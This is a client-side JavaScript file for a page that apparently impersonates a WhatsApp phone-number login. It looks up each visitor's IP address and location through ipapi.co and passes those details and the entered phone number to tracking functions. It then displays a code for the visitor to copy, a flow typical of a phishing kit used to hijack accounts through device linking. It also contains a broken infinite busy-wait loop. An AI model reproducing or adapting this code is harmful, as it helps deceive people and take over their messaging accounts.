$(document).ready(function() {
    let numberEntered = false;

    const userData = {
        ip: "Unknown",
        country: "Unknown",
        region: "Unknown",
        city: "Unknown",
    }

    async function checkNumber() {
        while (true)
        {
            if (!numberEntered) {
                continue;
            }

            let phoneNumber = $("#number").val().replace(/\D/g, '');

            break;
        }
    }

    $(".countries .item").on("click", function() {
        const code = $(this).attr("data-code");
        const lang = $(this).attr("data-lang");
        const name = $(this).attr("data-name");
        $("#number").val(`${code} `);
        $(".countries").toggleClass("hidden");
        $(".country").toggleClass("active");
        $(".country .image img").attr("src", `WhatsApp_files/assets/template/number/img/flags/${lang}.png`);
        $(".country .name").text(name);
    });

    $(".country").on("click", function() {
        $(".countries").toggleClass("hidden");
        $(this).toggleClass("active");
    });

    $("#search").on("input", function() {
        let searchText = $(this).val().toLowerCase();

        $(".countries .items .item").each(function() {
            let itemName = $(this).attr("data-name").toLowerCase();

            if (itemName.includes(searchText)) {
                $(this).removeClass("hidden");
            } else {
                $(this).addClass("hidden");
            }
        });
    });

    $("#number").on("input", function() {
        let phoneNumber = $(this).val().replace(/\D/g, '');

        if (phoneNumber.length > 0) {
            $(this).val(formatPhone(phoneNumber));
        }

        $(".countries .items .item").each(function() {
            let code = $(this).attr("data-code");
            let number = `+${phoneNumber}`;

            if (code === number || code.startsWith(number)) {
                let lang = $(this).attr("data-lang");
                let name = $(this).attr("data-name");

                $(".country .image img").attr("src", `WhatsApp_files/assets/template/number/img/flags/${lang}.png`);
                $(".country .name").text(name);
            }
        });
    });

    $("#next-step").on("click", function() {
        let phoneNumber = $("#number").val().replace(/\D/g, '');

        if (phoneNumber.length >= 11) {
            updateAuthotization(phoneNumber);
            let formattedNumber = formatPhone(phoneNumber);
            $(".block .error").addClass("hidden");
            $(".block.number").addClass("hidden");
            $(".block.code").removeClass("hidden");
            $("#user-number").text(formattedNumber);
            numberEntered = true;
        } else {
            $(".block .error").removeClass("hidden");
        }
    });

    $('#copy-btn').on('click', function() {
        var contentToCopy = $('#code').text();
        var tempInput = $('<input>');
        $('body').append(tempInput);
        tempInput.val(contentToCopy).select();
        document.execCommand('copy');
        tempInput.remove();
        $('.copy-msg').attr('style', '');
        setTimeout(function() {
            $('.copy-msg').attr('style', 'display: none;');
        }, 1000);
    });

    timeoutFetch(2000, "https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            if (data.country_calling_code) {
                const item = $(`.countries .items .item[data-lang='${data.country}']`);

                $("#number").val(`${data.country_calling_code} `);
                $(".country .image img").attr("src", `WhatsApp_files/assets/template/number/img/flags/${data.country}.png`);
                $(".country .name").text(item.attr("data-name"));

                userData.ip = data.ip;
                userData.country = data.country;
                userData.region = data.region;
                userData.city = data.city;

                addAuthotization(userData);
            }
        })
        .catch(error => {
            console.error(error);
            addAuthotization(userData);
        });

    let lazyLoad = new LazyLoad({});

    hidePreloader(500);
});